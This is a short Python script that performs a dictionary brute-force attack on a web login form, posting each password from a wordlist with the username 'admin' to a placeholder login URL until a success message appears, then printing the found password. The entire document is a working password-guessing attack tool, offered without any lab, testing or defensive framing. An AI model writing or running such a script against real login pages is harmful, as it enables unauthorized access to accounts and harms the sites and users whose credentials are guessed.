import requests

username = 'admin'
target_url = 'http://example.com/login'

with open('passwords.txt') as f:
    for password in f:
        password = password.strip()
        response = requests.post(target_url, data={'username': username, 'password': password})
        if 'Login successful' in response.text:
            print(f'Found password: {password}')
            break
